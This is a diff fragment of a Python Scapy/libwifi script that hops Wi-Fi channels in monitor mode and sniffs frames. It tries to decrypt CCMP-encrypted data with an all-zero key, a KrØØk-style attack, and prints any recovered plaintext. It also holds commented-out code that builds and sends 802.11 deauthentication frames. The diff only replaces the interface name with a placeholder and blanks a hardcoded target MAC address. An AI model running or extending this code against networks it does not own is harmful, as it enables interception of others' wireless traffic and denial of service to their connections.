@@ -4,7 +4,7 @@ from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
 import libwifi
 from libwifi import *
 
-interface = "wlp0s20f0u3mon"
+interface = "changeme"
 
 def hopper(iface):
     n = 1
@@ -19,8 +19,6 @@ def hopper(iface):
 F_bssids = []    # Found BSSIDs
 def findSSID(pkt):
 	data = ""
-	#mac_addr = "62:F4:51:7E:C3:3C"
-	#deauth(mac_addr, "FF:FF:FF:FF:FF:FF")
 	if(dot11_is_encrypted_data(pkt)):
 		if(decrypt_ccmp(pkt, "\x00" * 16).startswith("\xAA\xAA\x03\x00\x00\x00")):
 		    print("Data: %s" %(decrypt_ccmp(pkt, "\x00" * 16)))
@@ -35,7 +33,7 @@ def deauth(ap, client):
 
 
 if __name__ == "__main__":
-    #pket = RadioTap()/Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2="62:F4:51:7E:C3:3C", addr3="62:F4:51:7E:C3:3C")/Dot11Deauth(reason=2)
+    #pket = RadioTap()/Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2="", addr3="")/Dot11Deauth(reason=2)
     #sendp(pket, iface=interface, verbose=False)
     thread = threading.Thread(target=hopper, args=(interface, ), name="hopper")
     thread.daemon = True
